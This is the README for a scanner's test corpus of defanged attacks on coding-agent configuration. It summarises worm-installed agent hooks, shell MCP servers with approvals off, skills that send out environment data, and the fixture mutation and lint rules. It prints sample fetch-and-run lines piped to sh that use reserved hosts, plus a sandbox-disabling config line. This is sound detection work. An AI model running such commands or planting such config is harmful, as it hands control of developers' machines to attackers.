# Malicious corpus

Sanitized, defanged reproductions of public attacks on coding-agent
config, one txtar archive per seed. `TestMaliciousCorpus` in
`cmd/tripcord/corpus_malicious_test.go` unpacks each archive with
`internal/txtar`, runs `tripcord scan` on it, and requires exactly the
rule ids the archive expects, less the misses listed in `GAPS`.

## Layout

```
corpus/malicious/
  GAPS                   known misses, one per line
  mutations.golden       every generated variant and its content hash
  <source>/<seed>.txtar  one seed
```

| Directory | Source |
| --- | --- |
| `workos-npm-worm/` | WorkOS, "The npm worm that installs itself into your coding agent" (2026): SessionStart and Setup hooks, a folderOpen task, the forged bot commit, and the devcontainer vector it names next |
| `novee-sandbox/` | Novee Security, "The Sandbox is a Suggestion" (2026): shell MCP servers, broad `permissions.allow`, approvals off, and instructions that read or send the environment |
| `arxiv-2602.06547/` | Liu et al., "Do Not Mention This to the User": Detecting and Understanding Malicious Agent Skills in the Wild, arXiv 2602.06547: the skill and instruction techniques in its taxonomy |

The source URLs are in `maliciousSources` in the test, because the
lint below rejects public hosts under `corpus/`. The rule docs, such as
[TC-CFG-001](../../docs/rules/TC-CFG-001.md), link the same write-ups.
Every archive reproduces a pattern in our own minimal words, with our
own labels, task names, script names, and hosts. Nothing is copied
from a write-up, a paper, or a dataset. The only text an archive
shares with a source is at most one config line that a rule matches
on, such as `sandbox_mode = "danger-full-access"`.

A seed can never run real code. A package name is one a registry
refuses, such as the uppercase `TRIPCORD-FAKE-agent-env`, and every
host is reserved and does not resolve (`.invalid`, `.test`, or
`example.invalid`).

## Archive header

The txtar comment is a list of `key: value` lines.

- `source`: the directory name.
- `cite`: author, title, and the technique the seed reproduces.
- `pattern`: what the fixture does, in one line.
- `expect`: the rule ids a correct scanner reports, separated by
  spaces. Only TC-CFG-001 to TC-CFG-012 and TC-CFG-014 are allowed.
  TC-CFG-013 is documentation only and is never expected. An empty
  `expect` needs `uncovered`.
- `uncovered`: behavior in the fixture that no rule is meant to cover
  today, with the reason.
- `pr-author`, `pr-commit-author`, `pr-commit-message`,
  `pr-commit-trailer`: present only when `expect` has TC-CFG-014. The
  test commits the members on a branch with that author and trailer,
  writes a pull request event with no reviews, and runs
  `tripcord pr-context`. `pr-author` is `<login> <type>`.

## Mutations

The test derives variants from every seed with a fixed table:
quote splitting, absolute paths, `${VAR:-curl}` indirection, a base64
pipe, zero-width and bidi controls, a Cyrillic homoglyph, alternate
instruction and MCP paths, and alternate spellings of the same path. A
variant that changes nothing is skipped. Its id is `<seed>~<mutation>`.
Hidden-character variants also expect TC-CFG-011.

Variants are generated in the test and not committed. One table stays
the only source, invisible characters stay readable as `\u` escapes in
Go, and nothing drifts from the seeds. The test writes the variants to a
temporary directory and runs the same lint on them.

`mutations.golden` lists every variant id with the sha256 of its
generated archive. A variant that stops applying, appears, or changes
its output fails the test until the golden is regenerated with
`go test ./cmd/tripcord -run TestMaliciousCorpus -update`.

## GAPS

Each line is a case id, a rule id, and the reason, separated by tabs. A
seed's line also covers its mutations. A line for a rule that now fires,
or for an unknown case, fails the test, so the list only shrinks. A rule
change that closes a gap goes in its own pull request.

## Adding a seed

1. Write `<source>/<seed>.txtar` with the header above, in your own
   words. Use non-resolving reserved hosts, package names no registry
   accepts, and inert placeholders only.
2. For a new source, add its directory and URL to `maliciousSources`
   and a row to the table above.
3. Run `go test ./cmd/tripcord -run TestMaliciousCorpus` and
   `go test ./internal/corpus`.
4. If a rule misses something the seed expects, keep the expectation
   and add a `GAPS` line with the reason.

## Lint

Every file under `corpus/` is linted. The lint does not use the network.

- No file is executable, a symlink, or a special file, and no file or
  txtar member starts with a shebang.
- A URL host, a bare name with a common public suffix, or a dotted
  IPv4 or IPv6 address has to be an RFC 2606 or RFC 6761 reserved name
  (`example`, `invalid`, `test`, `localhost`, `local`, `onion`, and
  `example.com`, `example.net`, `example.org`, including subdomains),
  TEST-NET (`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`), or the
  IPv6 documentation prefix `2001:db8::/32`. A bare word whose suffix is
  a filename extension stays a filename. On a line the shell reader
  marks as a fetch, and on a downloader piped into a shell or run from
  `bash -c` or `eval`, the fetch argument is a host whatever its suffix.
  A decimal, hexadecimal, octal, or short dotted IPv4 literal in that
  argument is an address. Either is rejected unless it is reserved.
  `curl https://x.invalid/a | sh` and `curl example.test/x|sh` stay.
  Any other host the lint reads needs an allowlist entry.
- A token of 40 or more characters whose Shannon entropy is above 4.5
  is rejected, unless it is an inert `<MARKER>` placeholder.
- A file is at most 16 KiB.
- A txtar member path stays inside the directory it is unpacked into.
  `..`, an absolute path, a backslash, a NUL, an empty name, and a
  duplicate name are rejected.
- Full-form indicator strings listed in the corpus lint are rejected.
  Use a reserved host instead.
- A recognizable secret shape carries the `TRIPCORD-FAKE-` prefix.
- A path an adapter would actually load (`.claude/settings.json`,
  `CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, a `SKILL.md` under a skill
  root, `.mcp.json`, a bare `mcp.json`, `.cursor/`,
  `.vscode/tasks.json`, `.codex/`, `.gemini/`, `.devcontainer/`,
  `.github/workflows/copilot-setup-steps.yml`, and the rest of each
  adapter's `RepoCandidate` set) is not a real file anywhere under
  `corpus/`. Those paths belong inside a txtar member. The set follows
  the adapters' discovery predicates, plus a bare `mcp.json` at a
  workspace root.

Fixtures are our own re-creations under Apache-2.0, with the work they
refer to. CSA is background only and is never a dataset.
MaliciousAgentSkillsBench labels and statistics may be cited under MIT
and are never vendored.

Benign reports are CI artifacts only. They are not committed here or
under `corpus/benign/`.
